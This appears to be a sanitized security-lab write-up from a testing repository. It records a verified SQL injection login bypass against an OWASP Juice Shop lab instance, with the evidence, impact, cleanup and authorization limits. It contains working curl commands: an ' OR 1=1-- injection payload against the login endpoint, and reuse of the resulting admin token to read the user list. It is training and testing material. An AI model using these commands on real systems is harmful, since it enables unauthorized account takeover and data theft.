> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# verified_lab_flow_sqli_auth_bypass_admin_users_read

Status: verified-lab-flow / authorized disposable lab only
Date: 2026-05-21 UTC
Target: http://<lab-ip>:3000/
Run artifact: `<artifact-output-dir>/verified_flow_wave1_20260521T235533Z/manual/`

## Preconditions

- Scope confirmed by `config/scope.txt`: `<lab-ip>/16` covers `<lab-ip>`.
- Target health before and after wave: HTTP 200 on `/`.
- This flow is only for OWASP Juice Shop or an explicitly authorized disposable lab. Do not migrate to public/real targets without written scope/rules and a separate manual gate.

## Verified exploit-flow

1. SQL injection authentication bypass against the lab login endpoint:

```bash
curl -sS -D sqli_login_headers.txt -o sqli_login_body.json \
  -H 'Content-Type: application/json' \
  --data '{"email":"'"'"' OR 1=1--","password":"x"}' \
  http://<lab-ip>:3000/rest/user/login
```

2. Use the returned lab JWT as an admin session to read an authenticated admin API collection:

```bash
curl -sS -H 'Authorization: Bearer <LAB_JWT_REDACTED>' \
  http://<lab-ip>:3000/api/Users
```

## Evidence

- `sqli_login_status.txt`: HTTP 200 `application/json`.
- `sqli_login_parsed.txt`: `token_present=True`, `email=admin@juice-sh.op`, `user_id_or_bid=1`.
- `sqli_login_body_redacted.json`: token redacted evidence body.
- `authz_api_Users_noauth.txt`: unauthenticated `/api/Users` returned HTTP 401.
- `authz_api_Users_adminsql.txt`: same endpoint with SQLi-derived admin lab JWT returned HTTP 200 `application/json`, sample size 6343 bytes.

## Impact level

High in the disposable lab: unauthenticated SQL injection bypass produced an admin lab session and allowed reading an authenticated user collection endpoint that was blocked without the token.

## False-positive controls

- Compared `/api/Users` with no `Authorization` header: HTTP 401.
- Token value is redacted in retained artifacts.
- No real credentials or external secrets were collected; this is local lab-only data.

## Cleanup / recovery

- No persistent state change was required.
- Post-run health remained HTTP 200.
- No token is committed outside the local run artifact; retained body has redacted token.

## Real-target migration limits

Do not run this payload against real/public systems from this bundle. Real testing requires program authorization, allowed-technique confirmation, rate/impact limits, evidence handling, and no credential/session abuse beyond the approved rules.
